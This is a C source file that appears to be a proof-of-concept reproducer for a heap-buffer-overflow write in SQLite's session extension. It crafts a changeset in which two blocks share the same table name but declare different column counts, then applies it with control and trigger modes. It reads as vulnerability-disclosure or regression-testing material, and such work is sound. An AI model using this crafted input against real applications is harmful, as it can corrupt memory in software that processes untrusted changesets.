/* SQLite 3.53.4 session changeset same-name nCol heap write (ASan).
 *
 * Two table blocks named "t": first nCol=2 allocates aUpdateMask;
 * second nCol=64 skips sessionTableInfo reset and memset()s past it.
 * Witness is AddressSanitizer heap-buffer-overflow WRITE, not RCE.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sqlite3.h"

#ifndef SQLITE_ENABLE_SESSION
#error "SQLITE_ENABLE_SESSION is required"
#endif

#define LABEL "sqlite-session-ncol"
#define WITNESS "SQLITE-SESSION-NCOL-WITNESS"
#define SMALL_NCOL 2
#define LARGE_NCOL 64

static int conflict_cb(void *ctx, int conflict, sqlite3_changeset_iter *iter) {
    (void)ctx;
    (void)conflict;
    (void)iter;
    return SQLITE_CHANGESET_OMIT;
}

static unsigned char *put_int(unsigned char *p, sqlite3_int64 value) {
    uint64_t v = (uint64_t)value;
    int i;

    *p++ = SQLITE_INTEGER;
    for (i = 7; i >= 0; i--) {
        *p++ = (unsigned char)(v >> (i * 8));
    }
    return p;
}

static unsigned char *put_text(unsigned char *p, const char *value) {
    size_t n = strlen(value);

    *p++ = SQLITE_TEXT;
    *p++ = (unsigned char)n;
    memcpy(p, value, n);
    return p + n;
}

static unsigned char *put_small_block(unsigned char *p) {
    *p++ = 'T';
    *p++ = (unsigned char)SMALL_NCOL;
    *p++ = 1;
    *p++ = 0;
    *p++ = 't';
    *p++ = 0;
    *p++ = SQLITE_UPDATE;
    *p++ = 0;
    p = put_int(p, 1);
    p = put_text(p, "old");
    *p++ = 0;
    p = put_text(p, "new");
    return p;
}

static unsigned char *put_large_block(unsigned char *p) {
    int i;

    *p++ = 'T';
    *p++ = (unsigned char)LARGE_NCOL;
    for (i = 0; i < LARGE_NCOL; i++) {
        *p++ = (unsigned char)(i == 0);
    }
    *p++ = 't';
    *p++ = 0;
    *p++ = SQLITE_UPDATE;
    *p++ = 0;
    p = put_int(p, 1);
    for (i = 1; i < LARGE_NCOL; i++) {
        *p++ = 0;
    }
    for (i = 0; i < LARGE_NCOL - 1; i++) {
        *p++ = 0;
    }
    p = put_int(p, 2);
    return p;
}

static int apply_blob(const unsigned char *blob, int nblob) {
    sqlite3 *db = NULL;
    int rc;
    int apply_rc;

    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "open-rc=%d\n", rc);
        return 2;
    }
    rc = sqlite3_exec(
        db,
        "CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT);"
        "INSERT INTO t VALUES(1, 'old');",
        0,
        0,
        0
    );
    if (rc != SQLITE_OK) {
        fprintf(stderr, "exec-rc=%d\n", rc);
        sqlite3_close(db);
        return 2;
    }
    apply_rc = sqlite3changeset_apply(
        db, nblob, (void *)blob, 0, conflict_cb, 0
    );
    printf("apply-rc=%d\n", apply_rc);
    sqlite3_close(db);
    return apply_rc == SQLITE_OK ? 0 : 1;
}

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "trigger";
    unsigned char changeset[1024];
    unsigned char *p = changeset;

    printf("label=%s\n", LABEL);
    printf("witness=%s\n", WITNESS);
    printf("version=%s\n", sqlite3_libversion());
    printf("source-id=%s\n", sqlite3_sourceid());
    printf("mode=%s\n", mode);
    fflush(stdout);

    if (strcmp(mode, "version") == 0) {
        return 0;
    }

    p = put_small_block(p);
    if (strcmp(mode, "control") == 0) {
        printf("n-changeset=%d nCol=%d\n", (int)(p - changeset), SMALL_NCOL);
        fflush(stdout);
        return apply_blob(changeset, (int)(p - changeset));
    }
    if (strcmp(mode, "trigger") != 0) {
        fprintf(stderr, "usage: sqlite-session-ncol [version|control|trigger]\n");
        return 2;
    }

    p = put_large_block(p);
    printf(
        "n-changeset=%d first-nCol=%d second-nCol=%d\n",
        (int)(p - changeset),
        SMALL_NCOL,
        LARGE_NCOL
    );
    fflush(stdout);
    return apply_blob(changeset, (int)(p - changeset));
}
